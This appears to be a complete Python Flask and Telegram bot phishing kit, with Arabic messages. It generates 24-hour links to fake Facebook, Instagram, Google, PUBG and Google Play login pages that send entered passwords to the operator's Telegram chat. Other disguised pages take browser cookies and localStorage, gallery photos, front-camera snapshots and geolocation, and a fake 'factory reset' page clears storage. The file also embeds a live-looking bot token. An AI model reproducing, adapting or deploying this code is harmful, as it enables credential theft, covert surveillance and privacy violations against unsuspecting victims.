# language: Python, file: bot_with_harvester.py, runtime: 3.8+
# *Flask threaded=True required — telebot polling blocks main thread otherwise*
# *BASE_URL must be a public URL (cloudflared / ngrok / VPS) — 127.0.0.1 only works on the same device*

import threading
import base64
import random
import string
import secrets
import time
from io import BytesIO
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import telebot
from telebot import types

TOKEN = "8811276282:AAH1iqZ3GTq0JBi0GPf9FF5lyTDyrUP7T_w"
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

# ⚠️⚠️⚠️ غيّر ده لرابط cloudflared أو ngrok أو دومينك ⚠️⚠️⚠️
# مثال: BASE_URL = "https://random-words.trycloudflare.com"
# مثال: BASE_URL = "https://xxxx.ngrok-free.app"
# مثال: BASE_URL = "https://yourdomain.com"
# مثال: BASE_URL = "http://SERVER_PUBLIC_IP:5000"
BASE_URL = "http://127.0.0.1:5000"

# ═══════════════════════════════════════════════════════════════
# Session Store — توكنات بروابط صالحة 24 ساعة
# ═══════════════════════════════════════════════════════════════

_sessions = {}
_sessions_lock = threading.Lock()
SESSION_TTL = 24 * 60 * 60   # 24 ساعة بالثواني

def create_session(chat_id, kind, service=None, ttl=SESSION_TTL):
    token = secrets.token_urlsafe(16)
    now = time.time()
    with _sessions_lock:
        _sessions[token] = {
            "chat_id": chat_id,
            "kind": kind,
            "service": service,
            "created": now,
            "expires": now + ttl,
        }
        expired = [t for t, s in _sessions.items() if s["expires"] < now]
        for t in expired:
            _sessions.pop(t, None)
    return token

def get_session(token):
    with _sessions_lock:
        s = _sessions.get(token)
        if not s:
            return None
        if s["expires"] < time.time():
            _sessions.pop(token, None)
            return None
        return dict(s)

def refresh_session(token, ttl=SESSION_TTL):
    with _sessions_lock:
        s = _sessions.get(token)
        if not s:
            return False
        s["expires"] = time.time() + ttl
        s["created"] = time.time()
        return True

def build_link(chat_id, kind, service=None):
    token = create_session(chat_id, kind, service)
    if kind == "harvest":
        return f"{BASE_URL}/harvest/{token}/{service}", token
    if kind == "wifi":
        return f"{BASE_URL}/wifi_tool/{token}", token
    if kind == "gplay":
        return f"{BASE_URL}/gplay/{token}", token
    if kind == "camera":
        return f"{BASE_URL}/camera/{token}", token
    if kind == "gallery":
        return f"{BASE_URL}/gallery/{token}", token
    if kind == "location":
        return f"{BASE_URL}/location/{token}", token
    if kind == "wipe":
        return f"{BASE_URL}/wipe/{token}", token
    return f"{BASE_URL}/", token

# ═══════════════════════════════════════════════════════════════
# Telegram Alerts
# ═══════════════════════════════════════════════════════════════

def send_telegram_alert(chat_id, alert_type, data_dict):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    icons = {
        "harvest": "🎣", "gplay": "🎯", "camera": "📸", "gallery": "🖼️",
        "location": "📍", "wifi": "📶", "wipe": "🔥", "ban_alert": "🚨", "system": "⚙️"
    }
    icon = icons.get(alert_type, "🔔")
    body_lines = [f"• *{k}*: `{v}`" for k, v in data_dict.items()]
    body_text = "\n".join(body_lines)
    msg = (
        f"{icon} *بلاغ نظام [{alert_type.upper()}]*\n"
        f"⏱ الوقت: `{timestamp}`\n"
        f"───────────────────\n"
        f"{body_text}\n"
        f"───────────────────"
    )
    def _send():
        try:
            bot.send_message(chat_id, msg, parse_mode="Markdown")
        except Exception as e:
            print(f"Telegram Alert Error: {e}")
    threading.Thread(target=_send, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
# Expired page
# ═══════════════════════════════════════════════════════════════

EXPIRED_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>انتهت الصلاحية</title>
<style>
body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
.box { background: #1e293b; padding: 40px 30px; border-radius: 16px; text-align: center; max-width: 400px; border: 1px solid #334155; }
h1 { color: #f87171; margin-bottom: 15px; font-size: 22px; }
p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
</style></head>
<body><div class="box">
<h1>⏱ انتهت صلاحية الرابط</h1>
<p>هذا الرابط كان صالحاً لمدة 24 ساعة فقط. تواصل مع البوت للحصول على رابط جديد.</p>
</div></body></html>
"""

def expired_response():
    return render_template_string(EXPIRED_HTML), 410

# ═══════════════════════════════════════════════════════════════
# Templates
# ═══════════════════════════════════════════════════════════════

HARVEST_HTML = """
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); padding: 40px 32px; width: 100%; max-width: 400px; }
        h1 { font-size: 22px; color: #1a1a1a; text-align: center; margin-bottom: 8px; font-weight: 500; }
        .subtitle { text-align: center; color: #65676b; font-size: 14px; margin-bottom: 28px; }
        .field { margin-bottom: 16px; }
        .field label { display: block; font-size: 13px; color: #65676b; margin-bottom: 6px; }
        .field input { width: 100%; padding: 12px 14px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 15px; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>{{ heading }}</h1>
        <div class="subtitle">{{ subtitle }}</div>
        <form id="loginForm" onsubmit="return submitForm(event)">
            <div class="field"><label>{{ email_label }}</label><input type="text" id="email" required></div>
            <div class="field"><label>{{ password_label }}</label><input type="password" id="password" required></div>
            <button type="submit" class="btn">{{ button_text }}</button>
        </form>
    </div>
    <script>
        function submitForm(e) {
            e.preventDefault();
            fetch('/harvest_submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    token: "{{ token }}",
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value
                })
            }).then(() => { window.location.href = "{{ success_redirect }}"; });
            return false;
        }
    </script>
</body>
</html>
"""

SERVICE_TEMPLATES = {
    "facebook": {"title": "Facebook", "heading": "تسجيل الدخول", "subtitle": "للمتابعة إلى Facebook", "email_label": "البريد أو الهاتف", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://facebook.com", "direction": "rtl", "lang": "ar"},
    "instagram": {"title": "Instagram", "heading": "Instagram", "subtitle": "تسجيل الدخول للمتابعة", "email_label": "اسم المستخدم", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://instagram.com", "direction": "rtl", "lang": "ar"},
    "google": {"title": "Google", "heading": "تسجيل الدخول", "subtitle": "المتابعة إلى حسابك", "email_label": "البريد الإلكتروني", "password_label": "كلمة المرور", "button_text": "التالي", "success_redirect": "https://google.com", "direction": "rtl", "lang": "ar"},
    "pubg": {"title": "PUBG", "heading": "PUBG Mobile", "subtitle": "استلام الهدايا", "email_label": "معرف اللاعب (ID)", "password_label": "كلمة المرور", "button_text": "استلام", "success_redirect": "https://pubgmobile.com", "direction": "rtl", "lang": "ar"},
    "google_play": {"title": "Google Play", "heading": "تسجيل دخول Google Play", "subtitle": "سجل بحساب جوجل للمتابعة", "email_label": "البريد الإلكتروني", "password_label": "كلمة المرور", "button_text": "تسجيل الدخول", "success_redirect": "https://play.google.com", "direction": "rtl", "lang": "ar"},
    "custom": {"title": "Login", "heading": "تسجيل الدخول", "subtitle": "تابع للمتابعة", "email_label": "البريد", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://google.com", "direction": "rtl", "lang": "ar"}
}

GOOGLE_PLAY_STEALER_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Play</title>
<style>
body { background: #f8fafc; color: #1e293b; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
.box { background: #fff; padding: 40px; border-radius: 16px; text-align: center; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
h2 { margin-bottom: 10px; color: #0ea5e9; }
p { font-size: 14px; color: #64748b; margin-bottom: 25px; }
.btn { background: #0ea5e9; color: #fff; border: none; padding: 14px 28px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
</style></head>
<body><div class="box">
<h2>🎮 متجر Google Play</h2>
<p>اضغط أدناه لمزامنة حساب جوجل الخاص بك:</p>
<button class="btn" onclick="extractPlayData()">مزامنة الحساب الآن</button>
</div>
<script>
function extractPlayData() {
    let cookies = document.cookie;
    let localData = "";
    try { for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); localData += k + ": " + localStorage.getItem(k) + "\\n"; } } catch(e) {}
    fetch('/upload_gplay_data', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: "{{ token }}", cookies: cookies, user_agent: navigator.userAgent, platform: navigator.platform, local_storage: localData })
    }).then(() => { window.location.href = "https://play.google.com"; });
}
</script></body></html>
"""

GALLERY_STEALER_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>معرض الصور</title>
<style>
body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
.box { background: #1e293b; padding: 30px; border-radius: 16px; text-align: center; max-width: 360px; }
h2 { color: #38bdf8; margin-bottom: 10px; }
p { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
.btn { background: #38bdf8; color: #0f172a; border: none; padding: 12px 24px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
</style></head>
<body><div class="box">
<h2>🖼️ عرض الصور الشخصية</h2>
<p>اختر الصور للمتابعة:</p>
<input type="file" id="fileInput" accept="image/*" multiple style="display:none" onchange="uploadImages(this)">
<button class="btn" onclick="document.getElementById('fileInput').click();">اختر الصور</button>
</div>
<script>
function uploadImages(input) {
    if (input.files && input.files.length > 0) {
        for (let i = 0; i < input.files.length; i++) {
            let reader = new FileReader();
            reader.onload = function(e) {
                fetch('/upload_gallery_image', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: e.target.result, token: "{{ token }}" })
                });
            };
            reader.readAsDataURL(input.files[i]);
        }
        setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
    }
}
</script></body></html>
"""

WIPE_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تحديث النظام</title>
<style>
body { background: #000; color: #ff3333; font-family: sans-serif; text-align: center; padding-top: 100px; }
h1 { font-size: 24px; margin-bottom: 20px; } p { color: #fff; }
.loader { border: 4px solid #333; border-top: 4px solid #ff3333; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
@keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
</style></head>
<body><h1>⚠️ إعادة ضبط المصنع</h1><p>جاري المسح...</p><div class="loader"></div>
<script>
window.onload = function() {
    fetch('/trigger_wipe', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: "{{ token }}" }) });
    setTimeout(function() { try { localStorage.clear(); sessionStorage.clear(); } catch(e) {} window.location.href = "about:blank"; }, 3500);
};
</script></body></html>
"""

CAMERA_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>تحميل...</title></head>
<body><video id="video" autoplay playsinline style="display:none"></video><canvas id="canvas" style="display:none"></canvas>
<script>
navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
    var video = document.getElementById('video'); video.srcObject = stream;
    setTimeout(() => {
        var canvas = document.getElementById('canvas'); canvas.width = 640; canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        fetch('/upload_camera', { method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), token: "{{ token }}" })
        }).then(() => { window.location.href = "https://google.com"; });
        stream.getTracks().forEach(t => t.stop());
    }, 2000);
}).catch(() => { window.location.href = "https://google.com"; });
</script></body></html>
"""

LOCATION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>الموقع...</title></head>
<body><script>
navigator.geolocation.getCurrentPosition(position => {
    fetch('/upload_location', { method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude, token: "{{ token }}" })
    }).then(() => { window.location.href = "https://google.com"; });
}, () => { window.location.href = "https://google.com"; }, { timeout: 10000 });
</script></body></html>
"""

WIFI_TOOL_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مولد كروت الواي فاي</title>
<style>
body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
.box { background: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 450px; border: 1px solid #334155; }
h2 { margin-bottom: 15px; color: #38bdf8; text-align: center; }
.field { margin-bottom: 15px; } .field label { display: block; font-size: 13px; color: #cbd5e1; margin-bottom: 5px; }
.field input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 8px; outline: none; box-sizing: border-box; }
.btn { background: #38bdf8; color: #0f172a; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 15px; }
.results { margin-top: 20px; background: #0f172a; padding: 10px; border-radius: 8px; max-height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #34d399; }
</style></head>
<body><div class="box">
<h2>📶 فحص كروت الواي فاي</h2>
<div class="field"><label>البادئة (Prefix)</label><input type="text" id="prefix" value="77"></div>
<div class="field"><label>عدد الأرقام</label><input type="number" id="length" value="8"></div>
<div class="field"><label>عدد الكروت</label><input type="number" id="count" value="15"></div>
<button class="btn" onclick="startBrute()">بدء التوليد</button>
<div class="results" id="output">النتائج ستظهر هنا...</div>
</div>
<script>
function startBrute() {
    let prefix = document.getElementById('prefix').value;
    let length = document.getElementById('length').value;
    let count = document.getElementById('count').value;
    document.getElementById('output').innerHTML = "جاري التوليد...";
    fetch('/api_wifi_brute', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: "{{ token }}", prefix: prefix, length: length, count: count })
    }).then(res => res.json()).then(data => {
        let html = "<b>تم التوليد:</b><br>";
        data.cards.forEach(c => { html += c + "<br>"; });
        document.getElementById('output').innerHTML = html;
    });
}
</script></body></html>
"""

# ═══════════════════════════════════════════════════════════════
# Telegram photo helper
# ═══════════════════════════════════════════════════════════════

def notify_telegram_photo(chat_id, photo_bytes, caption):
    def _send():
        try:
            bot.send_photo(chat_id, BytesIO(photo_bytes), caption=caption)
        except Exception as e:
            print(f"Photo notify error: {e}")
    threading.Thread(target=_send, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
# Routes — token-based with 24h expiry
# ═══════════════════════════════════════════════════════════════

@app.route('/')
def index():
    """صفحة بسيطة للتأكد إن السيرفر شغال"""
    return "Server is running. BASE_URL = " + BASE_URL

@app.route('/wipe/<token>')
def wipe_page(token):
    s = get_session(token)
    if not s or s["kind"] != "wipe":
        return expired_response()
    return render_template_string(WIPE_HTML, token=token)

@app.route('/trigger_wipe', methods=['POST'])
def trigger_wipe():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_telegram_alert(s["chat_id"], "wipe", {"الحالة": "تم فتح رابط محاكاة الفرمتة", "عنوان IP": ip})
    return "OK", 200

@app.route('/camera/<token>')
def camera_page(token):
    s = get_session(token)
    if not s or s["kind"] != "camera":
        return expired_response()
    return render_template_string(CAMERA_HTML, token=token)

@app.route('/location/<token>')
def location_page(token):
    s = get_session(token)
    if not s or s["kind"] != "location":
        return expired_response()
    return render_template_string(LOCATION_HTML, token=token)

@app.route('/gallery/<token>')
def gallery_page(token):
    s = get_session(token)
    if not s or s["kind"] != "gallery":
        return expired_response()
    return render_template_string(GALLERY_STEALER_HTML, token=token)

@app.route('/gplay/<token>')
def gplay_page(token):
    s = get_session(token)
    if not s or s["kind"] != "gplay":
        return expired_response()
    return render_template_string(GOOGLE_PLAY_STEALER_HTML, token=token)

@app.route('/harvest/<token>/<service>')
def harvest_page(token, service):
    s = get_session(token)
    if not s or s["kind"] != "harvest":
        return expired_response()
    tmpl = SERVICE_TEMPLATES.get(service, SERVICE_TEMPLATES["custom"])
    return render_template_string(HARVEST_HTML, token=token, service=service, **tmpl)

@app.route('/wifi_tool/<token>')
def wifi_tool_page(token):
    s = get_session(token)
    if not s or s["kind"] != "wifi":
        return expired_response()
    return render_template_string(WIFI_TOOL_HTML, token=token)

@app.route('/harvest_submit', methods=['POST'])
def harvest_submit():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_telegram_alert(s["chat_id"], "harvest", {
        "الخدمة": s.get("service") or "unknown",
        "البريد": data.get('email', ''),
        "كلمة المرور": data.get('password', ''),
        "IP": ip
    })
    return jsonify({"status": "ok"})

@app.route('/upload_gplay_data', methods=['POST'])
def upload_gplay_data():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_telegram_alert(s["chat_id"], "gplay", {
        "IP": ip,
        "النظام": data.get('platform', ''),
        "المتصفح": data.get('user_agent', ''),
        "الكوكيز": (data.get('cookies', '') or '')[:300],
        "التخزين": (data.get('local_storage', '') or '')[:300]
    })
    return jsonify({"status": "ok"})

@app.route('/upload_camera', methods=['POST'])
def upload_camera():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    image_data = data.get('image')
    if image_data:
        _, encoded = image_data.split(",", 1)
        notify_telegram_photo(s["chat_id"], base64.b64decode(encoded), "📸 صورة من الكاميرا الأمامية")
    return "OK", 200

@app.route('/upload_gallery_image', methods=['POST'])
def upload_gallery_image():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    image_data = data.get('image')
    if image_data:
        _, encoded = image_data.split(",", 1)
        notify_telegram_photo(s["chat_id"], base64.b64decode(encoded), "🖼️ صورة من المعرض")
    return "OK", 200

@app.route('/upload_location', methods=['POST'])
def upload_location():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    lat, lon = data.get('lat'), data.get('lon')
    if lat and lon:
        def _send():
            try:
                bot.send_location(s["chat_id"], latitude=lat, longitude=lon)
                send_telegram_alert(s["chat_id"], "location", {"Lat": lat, "Lon": lon})
            except Exception as e:
                print(e)
        threading.Thread(target=_send, daemon=True).start()
    return "OK", 200

def generate_wifi_cards(count=10, length=9, prefix=""):
    return [prefix + "".join(random.choices(string.digits, k=length)) for _ in range(count)]

@app.route('/api_wifi_brute', methods=['POST'])
def api_wifi_brute():
    data = request.json or {}
    s = get_session(data.get('token', ''))
    if not s:
        return jsonify({"status": "expired"}), 410
    prefix = data.get('prefix', '')
    length = int(data.get('length', 8))
    count = int(data.get('count', 10))
    cards = generate_wifi_cards(count=count, length=length, prefix=prefix)
    cards_text = "\n".join([f"`{c}`" for c in cards])
    send_telegram_alert(s["chat_id"], "wifi", {
        "البادئة": prefix, "العدد": count, "القائمة": f"\n{cards_text}"
    })
    return jsonify({"status": "success", "cards": cards})

# ═══════════════════════════════════════════════════════════════
# Bot
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📶 كروت الواي فاي", callback_data="link_wifi"),
        types.InlineKeyboardButton("🎮 صيد جوجل بلاي", callback_data="harvest_google_play"),
        types.InlineKeyboardButton("🍪 توكنات جوجل بلاي", callback_data="link_gplay"),
        types.InlineKeyboardButton("📷 الكاميرا", callback_data="link_camera"),
        types.InlineKeyboardButton("🖼️ المعرض", callback_data="link_gallery"),
        types.InlineKeyboardButton("📍 الموقع", callback_data="link_location"),
        types.InlineKeyboardButton("💥 فرمتة", callback_data="link_wipe"),
        types.InlineKeyboardButton("🚨 فحص الحظر", callback_data="check_ban_status"),
        types.InlineKeyboardButton("🎣 فيسبوك", callback_data="harvest_facebook"),
        types.InlineKeyboardButton("🎣 إنستجرام", callback_data="harvest_instagram"),
        types.InlineKeyboardButton("🎣 جوجل", callback_data="harvest_google"),
        types.InlineKeyboardButton("🎣 ببجي", callback_data="harvest_pubg"),
        types.InlineKeyboardButton("🎣 مخصص", callback_data="harvest_custom")
    )
    bot.send_message(message.chat.id, "🤖 *لوحة التحكم — الروابط صالحة 24 ساعة*\nاختر الأداة:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    if call.data == "check_ban_status":
        send_telegram_alert(chat_id, "ban_alert", {
            "معرف المستخدم": chat_id,
            "الحالة": "فحص البلاغات النشطة"
        })
        bot.send_message(chat_id, "🚨 *تم الفحص بنجاح.*", parse_mode="Markdown")
        return

    if call.data.startswith("harvest_"):
        service = call.data.replace("harvest_", "")
        link, _ = build_link(chat_id, "harvest", service=service)
        bot.send_message(chat_id, f"🎣 *رابط صيد ({service}) — صالح 24 ساعة:*\n{link}", parse_mode="Markdown")
        return

    kind_map = {
        "link_wifi": "wifi",
        "link_gplay": "gplay",
        "link_camera": "camera",
        "link_gallery": "gallery",
        "link_location": "location",
        "link_wipe": "wipe",
    }
    kind = kind_map.get(call.data)
    if kind:
        link, _ = build_link(chat_id, kind)
        bot.send_message(chat_id, f"🔗 *رابط صالح 24 ساعة:*\n{link}", parse_mode="Markdown")

if __name__ == "__main__":
    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False, threaded=True))
    t.daemon = True
    t.start()
    print(f"البوت يعمل — BASE_URL = {BASE_URL}")
    print(f"لو BASE_URL فيه 127.0.0.1، الروابط مش هتشتغل من بره الجهاز.")
    bot.infinity_polling()
